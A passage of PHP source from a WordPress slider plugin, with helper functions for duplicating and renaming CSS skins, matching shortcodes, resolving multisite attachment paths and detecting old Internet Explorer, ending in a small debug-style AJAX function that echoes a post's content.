			if (sliderpro_get_setting($settings, 'enable_custom_css') && !in_array($slider_config['id'], $skins))
				array_push($skins, $slider_config['id']);
		}
		
		return $skins;
	}


/**
* Create a deep copy of the skin directory and update the CSS file
* with the new header information and the new class selector
*/
function sliderpro_replicate_skin_dir($origin, $destination, $new_name, $old_name = '', $header = '') {
	$origin_handle = opendir($origin);
	
	$success = @mkdir($destination . '/' . $new_name);

	if (!$success)
		return false;
	
	while ($resource = readdir($origin_handle)) {
		if ($resource == '.' || $resource == '..')
			continue;

		if (is_dir($origin . '/' . $resource)) {
			sliderpro_replicate_skin_dir($origin . '/' . $resource, $destination, $new_name . '/' . $resource);
		} else {
			if (preg_match('|\.css$|', $resource)) {				
				copy($origin . '/' . $resource, $destination . '/' . $new_name . '/' . $new_name . '.css');
				$css_file_path = $destination . '/' . $new_name . '/' . $new_name . '.css';
				
				// open the CSS file
				$skin_content = file_get_contents($css_file_path);
				
				// replace the old class selector with the new one
				$skin_content = str_replace('.' . $old_name, '.' . $new_name, $skin_content);
				
				// replace the old header with the new onw
				$skin_content = preg_replace('!/\*.*?\*/!s', $header, $skin_content, 1);
				
				// write the new CSS to the file
				file_put_contents($css_file_path, stripslashes($skin_content));
			} else {	
				copy($origin. '/' . $resource, $destination . '/' . $new_name . '/' . $resource);
			}
		}
	}
	
	return true;
}


/*
* Regex used to detect the specified terms (used in dynamic slide)
* Taken from the Core WordPress code
*/
function sliderpro_regex($terms) {
	$termsregexp = join('|', $terms);
	
	return
		 '\\['                               // Opening bracket
		. '(\\[?)'                           // 1: Optional second opening bracket for escaping shortcodes: [[tag]]
		. "($termsregexp)"                   // 2: Shortcode name
		. '\\b'                              // Word boundary
		. '('                                // 3: Unroll the loop: Inside the opening shortcode tag
		.     '[^\\]\\/]*'                   // Not a closing bracket or forward slash
		.     '(?:'
		.         '\\/(?!\\])'               // A forward slash not followed by a closing bracket
		.         '[^\\]\\/]*'               // Not a closing bracket or forward slash
		.     ')*?'
. ')'
. '(?:'
		.     '(\\/)'                        // 4: Self closing tag ...
		.     '\\]'                          // ... and closing bracket
		. '|'
		.     '\\]'                          // Closing bracket
		.     '(?:'
		.         '('                        // 5: Unroll the loop: Optionally, anything between the opening and closing shortcode tags
		.             '[^\\[]*+'             // Not an opening bracket
		.             '(?:'
		.                 '\\[(?!\\/\\2\\])' // An opening bracket not followed by the closing shortcode tag
		.                 '[^\\[]*+'         // Not an opening bracket
		.             ')*+'
.         ')'
		.         '\\[\\/\\2\\]'             // Closing shortcode tag
		.     ')?'
. ')'
		. '(\\]?)';                          // 6: Optional second closing brocket for escaping shortcodes: [[tag]]
	}


/*
* Compare skin names(used for sorting purposes)
*/
function sliderpro_compare_skin_names($x, $y) {
	return strcmp(strtolower($x['name']), strtolower($y['name']));
};


/*
* Get the real path of an attachment in a multisite environment 
*/
function sliderpro_get_real_path($initial_path) {
	$real_path = $initial_path;
	
	if (!is_main_site()) {
		global $blog_id, $current_site;
		$image = explode('/files/', $initial_path);
		
		if (isset($image[1]))
			$real_path = 'http://' . $current_site->domain . $current_site->path . 'wp-content/blogs.dir/' . $blog_id . '/files/' . $image[1];
	}
	
	return $real_path;
}


/*
* Returns whether the user uses a IE version lower than 9
*/
function sliderpro_is_old_ie() {
	return preg_match('/MSIE [1-8]/', $_SERVER['HTTP_USER_AGENT']);
};

function my_ajax() {
	$my_id = 1;
	$post_id_7 = get_post($my_id,$output); 
	$title = $post_id_7->post_content;
	echo $title;
	die();
}

?>